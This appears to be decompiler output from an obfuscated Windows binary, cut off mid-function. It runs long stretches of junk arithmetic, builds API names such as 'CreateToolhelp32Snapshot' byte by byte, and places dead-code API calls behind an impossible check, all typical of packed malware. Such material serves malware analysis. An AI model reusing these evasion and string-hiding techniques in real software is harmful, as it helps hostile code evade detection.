*(unaff_EBP + -0x34) = *(unaff_EBP + -0x34) + 0x39d15afe;\n    *(unaff_EBP + -0x34) = *(unaff_EBP + -0x34) + 0x199e58ee;\n    *0x4b7408 = *(unaff_EBP + -0x34);\n    *0x4b740c = *0x4b7408 >> 0x1f;\n    *0x44238a = 0x6c;\n    *(unaff_EBP + -0x14) = 0xf8bafe08;\n    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 0x74501f8;\n    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + -0x8f5420c;\n    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + -0x229ba20a;\n    *0x4b26e4 = *(unaff_EBP + -0x14);\n    *0x442380 = 0x6b;\n    *(unaff_EBP + -0x84) = 0x94bc8bd8;\n    *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + 0x6b437428;\n    *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + -0x2a55c8f6;\n    *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + -0x219c3666;\n    *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + 0x4bf1ff5c;\n    *0x4b26b8 = *(unaff_EBP + -0x84);\n    *0x4b26bc = *0x4b26b8 >> 0x1f;\n    *0x44238c = 0;\n    *0x4b26f0 = 0x6f;\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + -0x72a282f4;\n    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 0x72a282f4;\n    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + -0x5014a5da;\n    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + -0x76f2b5a;\n    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + -0x11ccadaa;\n    *0x4b7454 = *(unaff_EBP + -0x10);\n    *0x4b26ee = 0x54;\n    *(unaff_EBP + -0xb4) = 0;\n    *(unaff_EBP + -0xb4) = *(unaff_EBP + -0xb4) + -0x32f457be;\n    *(unaff_EBP + -0xb4) = *(unaff_EBP + -0xb4) + -0x22015206;\n    *(unaff_EBP + -0xb4) = *(unaff_EBP + -0xb4) + 0x161bfe0a;\n    *(unaff_EBP + -0xb4) = *(unaff_EBP + -0xb4) + 0x3ed9abba;\n    *(unaff_EBP + -0xb4) = *(unaff_EBP + -0xb4) + -0x104e06e4;\n    *(unaff_EBP + -0xb4) = *(unaff_EBP + -0xb4) + 0x104e06e4;\n    *0x4b5088 = *(unaff_EBP + -0xb4);\n    *0x4b26f9 = 0x6e;\n    *(unaff_EBP + -0x70) = 0xcaa81e7c;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 0x3557e184;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + -0x23ac3450;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 0x10f6c5bc;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 0x12b56e94;\n    *0x4b267c = *(unaff_EBP + -0x70);\n    *0x4b26f7 = 0x32;\n    *(unaff_EBP + -0xc0) = 0;\n    *(unaff_EBP + -0xc0) = *(unaff_EBP + -0xc0) + -0x61bdd37e;\n    *(unaff_EBP + -0xc0) = *(unaff_EBP + -0xc0) + 0x61bdd37e;\n    *(unaff_EBP + -0xc0) = *(unaff_EBP + -0xc0) + -0x75723574;\n    *(unaff_EBP + -0xc0) = *(unaff_EBP + -0xc0) + 0x75723574;\n    *(unaff_EBP + -0xc0) = *(unaff_EBP + -0xc0) + -0x91444f8;\n    *(unaff_EBP + -0xc0) = *(unaff_EBP + -0xc0) + 0x91444f8;\n    *0x4b2660 = *(unaff_EBP + -0xc0);\n    *0x4b26ea = 0x65;\n    *(unaff_EBP + -0xbc) = 0xab1213b6;\n    *(unaff_EBP + -0xbc) = *(unaff_EBP + -0xbc) + 0x54edec4a;\n    *(unaff_EBP + -0xbc) = *(unaff_EBP + -0xbc) + -0x7b821674;\n    *(unaff_EBP + -0xbc) = *(unaff_EBP + -0xbc) + 0x6539224c;\n    *(unaff_EBP + -0xbc) = *(unaff_EBP + -0xbc) + -0x25a642d8;\n    *0x4b50a8 = *(unaff_EBP + -0xbc);\n    *0x4b50ac = *0x4b50a8 >> 0x1f;\n    *0x4b26f2 = 0x68;\n    *(unaff_EBP + -0x78) = 0;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + -0x78) + -0x1abeee10;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + -0x78) + 0x1abeee10;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + -0x78) + -0x2701385c;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + -0x78) + 0x5ddbfc0;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + -0x78) + -0x59aae10c;\n    *0x442368 = *(unaff_EBP + -0x78);\n    *0x44236c = *0x442368 >> 0x1f;\n    *0x4b26ed = 0x65;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -0x1e258ce6;\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 0x1e258ce6;\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -0x4acc8dc6;\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 0x4acc8dc6;\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -0x5a7b9756;\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 0x5a7b9756;\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -0x5a11c9d8;\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -0x1d1c26c2;\n    *0x4d22bc = *(unaff_EBP + -0x1c);\n    *0x4b26ec = 0x74;\n    *(unaff_EBP + -0x5c) = 0;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + -0x3e57fe2e;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + -0x37b61ea2;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 0x760e1cd0;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + -0x29a9fcb4;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 0x29a9fcb4;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + -0x72fe0db4;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 0x64face50;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 0xe033f64;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + -0x5011fad4;\n    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + -0x18c850a;\n    *0x4b7420 = *(unaff_EBP + -0x5c);\n    *0x4b26ff = 0x74;\n    *(unaff_EBP + -0x24) = 0xe1ad4976;\n    *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + -0x2b46a5c6;\n    *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + -0x128a6cf4;\n    *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + 0x241515ee;\n    *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + 0x16737812;\n    *0x4b7448 = *(unaff_EBP + -0x24);\n    *0x4b26fe = 0x6f;\n    *(unaff_EBP + -0x44) = 0xa8197a5c;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 0x57e685a4;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + -0x79b16c0e;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 0x799701ba;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 0x1a6a54;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + -0x45e9c6da;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 0x360a4e98;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + -0x529e9ae0;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 0x627e1322;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + -0x6ddc988e;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 0x3640d3e4;\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 0x13a5b200;\n    *0x4563e8 = *(unaff_EBP + -0x44);\n    *0x4563ec = *0x4563e8 >> 0x1f;\n    *0x4b26fa = 0x61;\n    *0x4563f8 = 0;\n    *0x4563fc = 0;\n    *0x4b26ef = 0x6f;\n    *(unaff_EBP + -0x4c) = 0;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + -0x32f27554;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 0x32f27554;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + -0x65e6cb32;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 0x1da7b552;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 0x42314e0a;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + -0x1ade607e;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + -0x45cf38f4;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 0x66bb6148;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + -0x2ef5f38a;\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + -0x326ac75e;\n    *0x4b7468 = *(unaff_EBP + -0x4c);\n    *0x4b26f6 = 0x33;\n    *(unaff_EBP + -0xc4) = 0;\n    *(unaff_EBP + -0xc4) = *(unaff_EBP + -0xc4) + -0x6c9c6456;\n    *(unaff_EBP + -0xc4) = *(unaff_EBP + -0xc4) + 0x6c9c6456;\n    *(unaff_EBP + -0xc4) = *(unaff_EBP + -0xc4) + -0x429493d8;\n    *(unaff_EBP + -0xc4) = *(unaff_EBP + -0xc4) + 0x3f39d6ae;\n    *(unaff_EBP + -0xc4) = *(unaff_EBP + -0xc4) + 0x35abd2a;\n    *0x4b26a4 = *(unaff_EBP + -0xc4);\n    *0x4b26fb = 0x70;\n    *0x4b5058 = 0;\n    *0x4b505c = 0;\n    *0x4b26fd = 0x68;\n    *(unaff_EBP + -0x8c) = 0;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + -0x27b56eca;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 0x121cd9d6;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + -0x681ea724;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 0x7db73c18;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + -0x65eac6f6;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 0x65eac6f6;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + -0x73887f52;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 0x484a7b1e;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + -0x3ea485a8;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 0x69e289dc;\n    *0x4b2698 = *(unaff_EBP + -0x8c);\n    *0x4b269c = *0x4b2698 >> 0x1f;\n    *0x4b26f3 = 0x65;\n    *(unaff_EBP + -0x58) = 0xa19c7870;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + 0x32bd7626;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + 0x1b2d6244;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + 0x1078af26;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + -0x7d802f7a;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + 0x7d802f7a;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + -0x500c4120;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + 0x500c4120;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + -0x1b423f86;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + 0x1b423f86;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + -0xacd12fc;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + -0x110a1f2c;\n    *(unaff_EBP + -0x58) = *(unaff_EBP + -0x58) + -0x66ae2aa;\n    *0x4b26c0 = *(unaff_EBP + -0x58);\n    *0x4b26f4 = 0x6c;\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + -0x543eb3b0;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 0x2bbee706;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 0x287fccaa;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + -0x69c2a690;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 0x658be428;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + -0xa654006;\n    *0x442374 = *(unaff_EBP + -0x20);\n    *0x4b26e9 = 0x72;\n    *(unaff_EBP + -0xa8) = 0xd7c25d92;\n    *(unaff_EBP + -0xa8) = *(unaff_EBP + -0xa8) + 0x283da26e;\n    *0x4b5090 = *(unaff_EBP + -0xa8);\n    *0x4b5094 = *0x4b5090 >> 0x1f;\n    *0x4b26f8 = 0x53;\n    *(unaff_EBP + -200) = 0;\n    *(unaff_EBP + -200) = *(unaff_EBP + -200) + -0x25beece;\n    *(unaff_EBP + -200) = *(unaff_EBP + -200) + -0x678b9a18;\n    *(unaff_EBP + -200) = *(unaff_EBP + -200) + 0x69e788e6;\n    *(unaff_EBP + -200) = *(unaff_EBP + -200) + -0x7bc64bd2;\n    *(unaff_EBP + -200) = *(unaff_EBP + -200) + -0x20184f6;\n    *0x4b48a8 = *(unaff_EBP + -200);\n    *0x4b48ac = *0x4b48a8 >> 0x1f;\n    *0x4b26eb = 0x61;\n    *(unaff_EBP + -0x90) = 0xb5424a3a;\n    *(unaff_EBP + -0x90) = *(unaff_EBP + -0x90) + 0x39173db0;\n    *(unaff_EBP + -0x90) = *(unaff_EBP + -0x90) + 0x11a67816;\n    *(unaff_EBP + -0x90) = *(unaff_EBP + -0x90) + -0x68f921c0;\n    *(unaff_EBP + -0x90) = *(unaff_EBP + -0x90) + 0x68f921c0;\n    *0x4b2688 = *(unaff_EBP + -0x90);\n    *0x4b268c = *0x4b2688 >> 0x1f;\n    *0x4b26f1 = 0x6c;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + -0x7cac8982;\n    *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 0x7cac8982;\n    *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + -0x5acf5cfa;\n    *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 0x5acf5cfa;\n    *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + -0x63f28836;\n    *(unaff_EBP + -0x38) = *(unaff_EBP + -0x38) + 0x63f28836;\n    *0x4b26a0 = *(unaff_EBP + -0x38);\n    *0x4b26f5 = 0x70;\n    *(unaff_EBP + -0xa0) = 0xf66f5728;\n    *(unaff_EBP + -0xa0) = *(unaff_EBP + -0xa0) + -0x671e8b2;\n    *(unaff_EBP + -0xa0) = *(unaff_EBP + -0xa0) + -0x1a68812e;\n    *0x4b2690 = *(unaff_EBP + -0xa0);\n    *0x4b26fc = 0x73;\n    *(unaff_EBP + -0x88) = 0xf45a3d02;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + 0xba5c2fe;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + -0x39a582e8;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + 0x39a582e8;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + -0xa39af1e;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + 0xa39af1e;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + -0x5c652dbe;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + 0x1987dbfe;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + 0x42dd51c0;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + -0x465ea766;\n    *0x4b7458 = *(unaff_EBP + -0x88);\n    *0x4b26e8 = 0x43;\n    *(unaff_EBP + -0x94) = 0x85bf878a;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + 0x4ac75704;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + 0x2f792172;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + -0x69f8c6f8;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + 0x36aab95c;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + 0x334e0d9c;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + -0x4243f8c0;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + -0x2b0f3c90;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + 0x19025dd8;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + 0x5450d778;\n    *0x4b266c = *(unaff_EBP + -0x94);\n    *0x4b2700 = 0;\n    *0x4b09ac = 0x74;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + -0x794991d6;\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 0x794991d6;\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + -0x602e0dac;\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 0x16c25c98;\n    *0x4b2670 = *(unaff_EBP + -0x2c);\n    *0x4b2674 = *0x4b2670 >> 0x1f;\n    *0x4b09a8 = 0x46;\n    *(unaff_EBP + -100) = 0xa9710ac6;\n    *(unaff_EBP + -100) = *(unaff_EBP + -100) + 0x568ef53a;\n    *(unaff_EBP + -100) = *(unaff_EBP + -100) + -0x554da8de;\n    *(unaff_EBP + -100) = *(unaff_EBP + -100) + 0x554da8de;\n    *(unaff_EBP + -100) = *(unaff_EBP + -100) + -0x7bd057f4;\n    *(unaff_EBP + -100) = *(unaff_EBP + -100) + 0x478714c4;\n    *(unaff_EBP + -100) = *(unaff_EBP + -100) + 0x34494330;\n    *(unaff_EBP + -100) = *(unaff_EBP + -100) + -0x6889aa1e;\n    *(unaff_EBP + -100) = *(unaff_EBP + -100) + 0x6889aa1e;\n    *0x4563e0 = *(unaff_EBP + -100);\n    *0x4b09ad = 0x57;\n    *(unaff_EBP + -0x9c) = 0xb65eb2bc;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + 0x49a14d44;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + -0x5371ea9c;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + 0x39ce04ba;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + 0x19a3e5e2;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + -0x63e96582;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + 0x63e96582;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + -0x41b1df64;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + -0x399e9fc8;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + 0x7b507f2c;\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x9c) + -0x52c8cdc6;\n    *0x4b5038 = *(unaff_EBP + -0x9c);\n    *0x4b503c = *0x4b5038 >> 0x1f;\n    *0x4b09a6 = 0x33;\n    *(unaff_EBP + -0xa4) = 0;\n    *(unaff_EBP + -0xa4) = *(unaff_EBP + -0xa4) + -0x7ea20448;\n    *(unaff_EBP + -0xa4) = *(unaff_EBP + -0xa4) + 0x7ea20448;\n    *0x4b5084 = *(unaff_EBP + -0xa4);\n    *0x4b09a9 = 0x69;\n    *(unaff_EBP + -0x48) = 0xe3cc6198;\n    *(unaff_EBP + -0x48) = *(unaff_EBP + -0x48) + 0x1c339e68;\n    *0x4b5040 = *(unaff_EBP + -0x48);\n    *0x4b09a3 = 0x75;\n    *(unaff_EBP + -0x54) = 0;\n    *(unaff_EBP + -0x54) = *(unaff_EBP + -0x54) + -0x6665652e;\n    *(unaff_EBP + -0x54) = *(unaff_EBP + -0x54) + 0x335edde0;\n    *(unaff_EBP + -0x54) = *(unaff_EBP + -0x54) + -0xd691542;\n    *(unaff_EBP + -0x54) = *(unaff_EBP + -0x54) + 0x10d733f2;\n    *(unaff_EBP + -0x54) = *(unaff_EBP + -0x54) + 0x2f98689e;\n    *(unaff_EBP + -0x54) = *(unaff_EBP + -0x54) + -0x6a0fbb26;\n    *(unaff_EBP + -0x54) = *(unaff_EBP + -0x54) + 0x6a0fbb26;\n    *0x4d22c4 = *(unaff_EBP + -0x54);\n    *0x4b09a5 = 0x65;\n    *(unaff_EBP + -0x7c) = 0xfedc9548;\n    *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x7c) + 0x1236ab8;\n    *0x4af0a0 = *(unaff_EBP + -0x7c);\n    *0x4af0a4 = *0x4af0a0 >> 0x1f;\n    *0x4b09a0 = 0x4d;\n    *(unaff_EBP + -0xac) = 0;\n    *(unaff_EBP + -0xac) = *(unaff_EBP + -0xac) + -0x47504f4;\n    *(unaff_EBP + -0xac) = *(unaff_EBP + -0xac) + 0x30e48aa;\n    *(unaff_EBP + -0xac) = *(unaff_EBP + -0xac) + 0x166bc4a;\n    *(unaff_EBP + -0xac) = *(unaff_EBP + -0xac) + -0x201ebe70;\n    *(unaff_EBP + -0xac) = *(unaff_EBP + -0xac) + 0x201ebe70;\n    *0x4b2680 = *(unaff_EBP + -0xac);\n    *0x4b2684 = *0x4b2680 >> 0x1f;\n    *0x4b09a2 = 100;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + -0x274e2bde;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + 0x1dd92632;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + -0x64c78c38;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + 0x6e3c91e4;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + -0x3d8a361a;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + -0x1f2a1094;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + 0x5cb446ae;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + -0x3754cc50;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + 0xf3938d2;\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x3c) + -0x10aae730;\n    *0x4563c8 = *(unaff_EBP + -0x3c);\n    *0x4563cc = *0x4563c8 >> 0x1f;\n    *0x4b09ab = 0x73;\n    *(unaff_EBP + -0x98) = 0;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + -0x429d082c;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + 0x429d082c;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + -0x216641d6;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + -0xd7e4758;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + 0x2ee4892e;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + -0xe5b33de;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + 0xe5b33de;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + -0x3e859752;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + 0x14d991c4;\n    *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + -0x1faaf92c;\n    *0x4b50a4 = *(unaff_EBP + -0x98);\n    *0x4b09a4 = 0x6c;\n    *(unaff_EBP + -0x60) = 0;\n    *(unaff_EBP + -0x60) = *(unaff_EBP + -0x60) + -0x7572d156;\n    *(unaff_EBP + -0x60) = *(unaff_EBP + -0x60) + 0x7572d156;\n    *0x4b5068 = *(unaff_EBP + -0x60);\n    *0x4b506c = *0x4b5068 >> 0x1f;\n    *0x4b09a1 = 0x6f;\n    *(unaff_EBP + -0xb8) = 0xce0e9e2a;\n    *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + 0x2557abe;\n    *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + 0x2f9be718;\n    *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + -0x6b68217c;\n    *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + 0x5959a020;\n    *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + 0x120e815c;\n    *(unaff_EBP + -0xb8) = *(unaff_EBP + -0xb8) + -0x78b606aa;\n    *0x4d22dc = *(unaff_EBP + -0xb8);\n    *0x4b09a7 = 0x32;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + -0x2ea939d8;\n    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + 0x2ea939d8;\n    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + -0x1bbdb07c;\n    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + 0x1bbdb07c;\n    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + -0x17387f1c;\n    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + 0x4ac4cd0;\n    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + -0x4e0d6a82;\n    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + 0x60999cce;\n    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + -0xb1648a4;\n    *0x443960 = *(unaff_EBP + -0x40);\n    *0x443964 = *0x443960 >> 0x1f;\n    *0x4b09aa = 0x72;\n    *(unaff_EBP + -0x68) = 0;\n    *(unaff_EBP + -0x68) = *(unaff_EBP + -0x68) + -0x82e1df4;\n    *(unaff_EBP + -0x68) = *(unaff_EBP + -0x68) + -0x5a846e08;\n    *(unaff_EBP + -0x68) = *(unaff_EBP + -0x68) + 0x48eac2d6;\n    *(unaff_EBP + -0x68) = *(unaff_EBP + -0x68) + 0x19c7c926;\n    *(unaff_EBP + -0x68) = *(unaff_EBP + -0x68) + -0x8a692c6;\n    *0x4b09ae = 0;\n    *0x4b26a8 = *(unaff_EBP + -0x68);\n    *(unaff_EBP + -0xd4) = 0xc7ba176a;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + -0xa5201c8;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + 0x4297ea5e;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + -0x78b402f0;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + 0x55d40df6;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + -0x451003a2;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + 0x67eff89c;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + -0x5c1c89be;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + 0x50f78a;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + 0x5bcb9234;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + -0x7508cb3a;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + 0x30f25eaa;\n    *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + 0x44166c98;\n    uVar3 = (*(unaff_EBP + -0x68) & 0x20129151) >> 0x18;\n    *(unaff_EBP + -0xd0) = 0x3c0;\n    if (*(unaff_EBP + -0xd0) == 0x3c0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(0x443968);\n        if (iVar4 == 0x8cb23) {\n            (*_sym.imp.ADVAPI32.dll_OpenServiceW)(0, 0, 0);\n            (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(0, 0);\n            (*_sym.imp.ADVAPI32.dll_BackupEventLogA)(0, 0);\n            sub.KERNEL32.dll_VerLanguageNameW(0, unaff_EBP + -0x124c, 0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA)(0);\n            (*_sym.imp.KERNEL32.dll_FindNextVolumeMountPointA)(0, unaff_EBP + -0x64c, 0);\n            (*_sym.imp.KERNEL32.dll_GetFirmwareEnvironmentVariableA)(0, 0, unaff_EBP + -0xa4c, 0);\n            (*_sym.imp.KERNEL32.dll_FindFirstChangeNotificationW)(0, 0, 0);\n            (*_sym.imp.USER32.dll_SendMessageA)(0, 0, 0, 0);\n            (*_sym.imp.USER32.dll_SetWindowTextA)(0, 0);\n            (*_sym.imp.MSIMG32.dll_AlphaBlend)(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, *(unaff_EBP + -0xd8));\n            fcn.00408d8a(3, 1);\n            *(unaff_EBP + -4) = 0;\n            fcn.004089ec();\n            fcn.00408c97();\n            fcn.00408b4a();\n            fcn.0040774d();\n            *(unaff_EBP + -4) = 1;\n            